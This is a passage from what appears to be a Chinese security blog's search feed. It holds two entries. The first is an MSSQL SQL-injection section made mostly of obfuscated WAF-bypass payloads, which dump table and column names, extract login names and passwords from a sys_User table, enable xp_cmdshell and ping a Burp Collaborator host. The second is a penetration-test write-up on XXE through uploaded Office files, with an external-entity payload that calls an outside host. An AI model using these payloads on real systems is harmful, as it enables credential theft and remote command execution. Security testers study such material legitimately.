-<h4 id="绕过-union-select-x-from-x-："><a href="#绕过-union-select-x-from-x-：" class="headerlink" title="绕过 union select x from x ："></a>绕过 <code>union select x from x </code>：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall(select--^!~%*/%0b/*%0anull,null,null,null,1,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b/*%0afrom--^!~%*/%0b/*%0ax)--</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="绕过-union-all-select-x-from-x-："><a href="#绕过-union-all-select-x-from-x-：" class="headerlink" title="绕过 union all select x from x ："></a>绕过 <code>union all select x from x</code> ：</h4><p><strong>查表名：</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,name,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asysobjects)--</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>查字段名：</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,COLUMN_NAME,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0ainformation_schema.COLUMNS where TABLE_NAME=&#x27;</span>sys_User<span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>查数据：</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,U_LoginName,U_Password ,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asys_User)--</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>开启xp_cmdshell：</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;EXEC--^!~%*/%0b%0asp_configure &#x27;</span><span class="keyword">show</span> advanced options<span class="string">&#x27;, 1;RECONFIGURE;EXEC--^!~%*/%0b%0asp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;, 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>执行ping命令测试：</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;exec--^!~%*/%0b%0amaster..xp_cmdshell%20%27ping%20hn81hzwt1rqcgj20qnh50is0drjh76.burpcollaborator.net%27--</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>SQLi</category>
-      </categories>
-      <tags>
-        <tag>SQLi</tag>
-        <tag>注入</tag>
-        <tag>bypass</tag>
-        <tag>CDN</tag>
-        <tag>WAF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通过 Office Open XML 解析器进行XXE攻击</title>
-    <url>/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
-<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>
-
-<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
-<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
-<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
-<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
-<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
-<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
-<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>WEB安全</tag>
-        <tag>XXE</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
 </search>
